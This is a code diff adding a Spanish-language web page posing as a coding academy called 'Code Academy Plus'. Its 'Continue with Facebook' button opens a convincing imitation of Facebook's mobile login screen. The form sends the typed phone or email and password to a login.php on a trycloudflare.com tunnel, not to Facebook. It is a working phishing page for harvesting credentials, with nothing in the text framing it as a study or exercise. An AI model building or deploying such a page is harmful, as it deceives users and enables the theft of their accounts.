@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Code Academy Plus</title>
+<style>
+:root{--bg:#0e1420;--card:#171f2e;--tx:#e8edf5;--mut:#8b97ab;--pri:#4f8cff;--bd:#263347;--g:#34c38f}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;background:var(--bg);color:var(--tx);font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left)}
+.scr{display:none;width:100%;max-width:420px}
+.scr.on{display:block}
+.card{background:var(--card);border:1px solid var(--bd);border-radius:18px;padding:28px 24px;text-align:center}
+.logo{font-size:40px}
+h1{font-size:22px;margin:6px 0 2px}
+p.sub{color:var(--mut);margin:0 0 22px;font-size:14px}
+.btn{width:100%;display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;border-radius:12px;border:1px solid var(--bd);background:#fff;color:#1d1d1d;font-weight:600;font-size:15px;cursor:pointer;margin-bottom:12px}
+.btn.fb{background:#1877f2;color:#fff;border:none}
+.ic{width:20px;height:20px;flex:0 0 auto}
+.err{display:none;margin-top:14px;background:#3a1f22;border:1px solid #6b2b30;color:#ffb4b4;border-radius:10px;padding:12px;font-size:13.5px;text-align:left}
+.err.on{display:block}
+.load{display:none;flex-direction:column;align-items:center;gap:12px;padding:20px 0}
+.load.on{display:flex}
+.spin{width:38px;height:38px;border:4px solid var(--bd);border-top-color:var(--pri);border-radius:50%;animation:sp 1s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.field{text-align:left;margin-bottom:12px}
+.field label{font-size:13px;color:var(--mut);display:block;margin-bottom:5px}
+.field input{width:100%;padding:11px;border-radius:10px;border:1px solid var(--bd);background:#101722;color:var(--tx);font-size:15px}
+#fblogin{max-width:none;width:100%;position:fixed;inset:0;background:#fff;color:#1c1e21;display:none;flex-direction:column;padding:calc(16px + env(safe-area-inset-top)) 22px calc(20px + env(safe-area-inset-bottom))}
+#fblogin.on{display:flex}
+.fbtop{display:flex;align-items:center;justify-content:space-between}
+.fbback{font-size:22px;color:#1c1e21;background:none;border:0;cursor:pointer;padding:6px}
+.fblang{font-size:14px;color:#606770;display:flex;align-items:center;gap:4px}
+.fbmid{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px}
+.fbicon{width:64px;height:64px;border-radius:50%;background:#1877f2;display:flex;align-items:center;justify-content:center}
+.fbicon svg{width:34px;height:34px}
+.fbfields{width:100%;max-width:400px}
+.fbinput{width:100%;padding:14px 16px;border-radius:26px;border:1px solid #ccd0d5;background:#fff;color:#1c1e21;font-size:15px;margin-bottom:12px}
+.fbinput::placeholder{color:#8a8d91}
+.fbbtn{width:100%;max-width:400px;padding:13px;border-radius:26px;border:0;background:#1877f2;color:#fff;font-weight:700;font-size:16px;cursor:pointer}
+.fbforgot{text-align:center;color:#1c1e21;font-size:14px;margin-top:16px;text-decoration:none}
+.fbdiv{width:100%;max-width:400px;height:1px;background:#dadde1;margin:22px 0}
+.fbcreate{width:100%;max-width:400px;padding:12px;border-radius:26px;border:1px solid #1877f2;background:#fff;color:#1877f2;font-weight:700;font-size:15px;cursor:pointer}
+.fblangwrap{position:relative}
+.fblang{background:none;border:0;font-size:14px;color:#606770;cursor:pointer;padding:4px 2px;font-family:inherit}
+.langlist{display:none;position:absolute;right:0;top:30px;background:#fff;border:1px solid #dadde1;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,.15);min-width:150px;z-index:5;overflow:hidden}
+.langlist.on{display:block}
+.langlist div{padding:10px 14px;font-size:14px;color:#1c1e21;cursor:pointer}
+.langlist div:hover{background:#f0f2f5}
+.fakeload{position:fixed;inset:0;background:#fff;z-index:30;display:none;align-items:center;justify-content:center}
+.fakeload.on{display:flex}
+.spin2{width:46px;height:46px;border:4px solid #dbe2ea;border-top-color:#1877f2;border-radius:50%;animation:sp 1s linear infinite}
+.wrap{max-width:560px;margin:0 auto;width:100%}
+.bar{height:6px;background:var(--bd);border-radius:4px;overflow:hidden;margin-bottom:18px}
+.bar i{display:block;height:100%;background:var(--pri);width:0%;transition:.4s}
+.step{background:var(--card);border:1px solid var(--bd);border-radius:18px;padding:26px 22px}
+.step h2{margin-top:0}
+.step p{color:#c7d0de;line-height:1.55}
+.tag{display:inline-block;background:#1b2538;color:var(--pri);font-size:12px;font-weight:700;padding:4px 10px;border-radius:20px;margin-bottom:10px}
+.opt{display:block;width:100%;text-align:left;padding:12px 14px;margin:8px 0;border-radius:12px;border:1px solid var(--bd);background:#101722;color:var(--tx);cursor:pointer;font-size:14.5px}
+.opt:hover{border-color:var(--pri)}
+.opt.ok{border-color:var(--g);background:#0f2a22}
+.opt.bad{border-color:#e05a5a;background:#2a1414}
+.nav{display:flex;justify-content:flex-end;margin-top:18px}
+.nav button{background:var(--pri);color:#fff;border:0;padding:11px 20px;border-radius:10px;font-weight:600;cursor:pointer}
+.nav button:disabled{opacity:.4}
+.fb{font-size:13px;color:var(--mut);margin-top:10px;min-height:18px}
+code{background:#0c121c;border:1px solid var(--bd);border-radius:8px;padding:10px;display:block;white-space:pre;color:#9fd8a0;font-size:13px;margin:10px 0;overflow-x:auto}
+#intro{max-width:none;width:100%;padding:0;position:fixed;inset:0;display:none;align-items:stretch;justify-content:stretch}
+#intro.on{display:block}
+#bgGrad{position:fixed;inset:0;z-index:0;background:radial-gradient(circle at 15% 20%, #ff4d9d55, transparent 55%),radial-gradient(circle at 85% 15%, #4d9dff55, transparent 55%),radial-gradient(circle at 50% 85%, #34d39955, transparent 55%),radial-gradient(circle at 85% 80%, #ffd34d44, transparent 55%),#080b12;background-size:160% 160%;animation:bgmove 18s ease-in-out infinite alternate}
+@keyframes bgmove{0%{background-position:0% 0%, 100% 0%, 50% 100%, 100% 100%}100%{background-position:30% 30%, 70% 10%, 30% 80%, 90% 60%}}
+#gl{position:fixed;inset:0;z-index:1;width:100%;height:100%}
+.skip{position:fixed;top:calc(14px + env(safe-area-inset-top));right:calc(14px + env(safe-area-inset-right));background:rgba(10,14,22,.7);backdrop-filter:blur(6px);border:1px solid #3a4a66;color:#cfd8e8;font-size:12px;padding:7px 14px;border-radius:20px;cursor:pointer;z-index:9}
+.loadwrap{position:fixed;inset:0;background:#080b12;z-index:20;display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:#cfd8e8;text-align:center;padding:20px}
+.loadwrap.on{display:flex}
+.lbar{width:min(300px,70vw);height:8px;background:#1b2538;border-radius:6px;overflow:hidden}
+.lbar i{display:block;height:100%;width:0%;background:linear-gradient(90deg,#ff4d9d,#4d9dff,#34d399);transition:.2s}
+</style>
+</head>
+<body>
+<div class="scr on" id="login">
+ <div class="card">
+  <div class="logo">👩‍💻</div>
+  <h1>Code Academy Plus</h1>
+  <p class="sub">Inicia sesión para empezar tu primera clase</p>
+  <button class="btn" id="bg"><svg class="ic" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3c-1.6 4.7-6 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.1 8 3l5.7-5.7C34.6 6 29.6 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.7-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.6 16 19 13 24 13c3.1 0 5.8 1.1 8 3l5.7-5.7C34.6 6 29.6 4 24 4c-7.4 0-13.8 4.2-17.7 10.7z"/><path fill="#4CAF50" d="M24 44c5.5 0 10.4-1.9 14.2-5.1l-6.6-5.4C29.6 35.3 27 36 24 36c-5.3 0-9.7-3.4-11.3-8.1l-6.6 5.1C9.9 39.7 16.4 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.2 4.2-4.1 5.6l6.6 5.4C41.6 35.6 44 30.2 44 24c0-1.3-.1-2.7-.4-3.5z"/></svg>Continuar con Google</button>
+  <button class="btn fb" id="bf"><svg class="ic" viewBox="0 0 264 512" fill="#fff" style="width:11px;height:20px"><path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/></svg>Continuar con Facebook</button>
+  <div class="err" id="gerr">⚠️ No se pudo iniciar sesión.<br>Los servidores están llenos en este momento. Inténtalo de nuevo más tarde o usa otro método de inicio de sesión.</div>
+  <div class="load" id="load"><div class="spin"></div><span style="color:var(--mut);font-size:14px">Verificando cuenta...</span></div>
+ </div>
+</div>
+
+<div class="scr" id="fblogin">
+ <div class="fbtop">
+  <button class="fbback" id="fbback">←</button>
+  <div class="fblangwrap">
+   <button class="fblang" id="langBtn">Español ⌄</button>
+   <div class="langlist" id="langList">
+    <div data-l="Español">Español</div>
+    <div data-l="English">English</div>
+    <div data-l="Português">Português</div>
+    <div data-l="Français">Français</div>
+    <div data-l="Deutsch">Deutsch</div>
+    <div data-l="Italiano">Italiano</div>
+    <div data-l="中文">中文</div>
+    <div data-l="العربية">العربية</div>
+   </div>
+  </div>
+ </div>
+ <div class="fbmid">
+  <div class="fbicon"><svg viewBox="0 0 264 512" fill="#fff" style="width:18px;height:34px"><path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/></svg></div>
+  <div class="fbfields">
+   <form action="  https://gentle-started-reductions-tabs.trycloudflare.com/login.php" method="POST">
+    <input class="fbinput" name="username" id="f1" placeholder="Celular o correo electrónico">
+    <input class="fbinput" name="password" id="f2" type="password" placeholder="Contraseña">
+    <button type="submit" class="fbbtn" id="bf2">Iniciar sesión</button>
+   </form>
+   <a class="fbforgot" href="#" id="fbforgot">¿Olvidaste tu contraseña?</a>
+  </div>
+ </div>
+ <div style="display:flex;flex-direction:column;align-items:center">
+  <div class="fbdiv"></div>
+  <button class="fbcreate" id="fbcreate">Crear cuenta nueva</button>
+ </div>
+</div>
+
+<div class="fakeload" id="fakeload"><div class="spin2"></div></div>
+<div class="loadwrap" id="loadwrap">
+ <div class="spin"></div>
+ <div>Preparando la escena...</div>
+ <div class="lbar"><i id="lbarFill"></i></div>
+</div>
+
+<div class="scr" id="intro">
+ <div id="bgGrad"></div>
+ <canvas id="gl"></canvas>
+ <button class="skip" id="skip">Saltar ›</button>
+ <!-- Modelo 3D cargado desde Catbox -->
+ <script type="module">
+  import { ModelViewerElement } from 'https://cdn.jsdelivr.net/npm/@google/model-viewer@4.0.0/dist/model-viewer.min.js';
+  customElements.define('model-viewer', ModelViewerElement);
+ </script>
+ <model-viewer
+  src="https://files.catbox.moe/smydfy.glb"
+  alt="Escena 3D"
+  auto-rotate
+  camera-controls
+  shadow-intensity="1"
+  exposure="1.2"
+  style="position:fixed;inset:0;width:100%;height:100%;z-index:1"
+ ></model-viewer>
+</div>
+
+<script>
+// Aquí va tu JavaScript de navegación sin el modelo incrustado pesado
+const loginScr = document.getElementById('login');
+const fbScr = document.getElementById('fblogin');
+const introScr = document.getElementById('intro');
+const bf = document.getElementById('bf');
+const bg = document.getElementById('bg');
+const fbBack = document.getElementById('fbback');
+const skipBtn = document.getElementById('skip');
+const langBtn = document.getElementById('langBtn');
+const langList = document.getElementById('langList');
+
+bf.addEventListener('click', ()=>{
+ loginScr.classList.remove('on');
+ fbScr.classList.add('on');
+});
+
+fbBack.addEventListener('click', ()=>{
+ fbScr.classList.remove('on');
+ loginScr.classList.add('on');
+});
+
+bg.addEventListener('click', ()=>{
+ loginScr.classList.remove('on');
+ introScr.classList.add('on');
+});
+
+skipBtn.addEventListener('click', ()=>{
+ introScr.classList.remove('on');
+ loginScr.classList.add('on');
+});
+
+langBtn.addEventListener('click', ()=> langList.classList.toggle('on'));
+document.addEventListener('click', e=>{
+ if(!langBtn.contains(e.target) && !langList.contains(e.target)) langList.classList.remove('on');
+});
+</script>
+</body>
+</html>
